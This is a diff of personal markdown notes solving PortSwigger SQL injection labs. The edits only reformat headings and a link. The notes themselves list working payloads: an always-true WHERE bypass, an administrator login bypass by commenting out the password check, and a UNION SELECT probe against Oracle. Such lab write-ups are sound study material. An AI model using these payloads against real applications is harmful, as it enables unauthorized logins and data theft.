@@ -1,8 +1,8 @@
 # SQL injection
 
-```https://portswigger.net/web-security/sql-injection/cheat-sheet```
+ * [MSSQL Injection](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-## Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
 >**Q. SELECT * FROM products WHERE category = 'Gifts' AND released = 1 **
 
@@ -10,13 +10,13 @@
 '+OR+1=1--
 ```
 
-## Lab2: SQL injection vulnerability allowing login bypass
+### Lab2: SQL injection vulnerability allowing login bypass
 >**Q. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. **
 
 ```sh
 administrator'--
 ```
-## Lab3: SQL injection attack, querying the database type and version on Oracle
+### Lab3: SQL injection attack, querying the database type and version on Oracle
 ```sh
 '+UNION+SELECT+'abc','def'+FROM+dual--
 ```
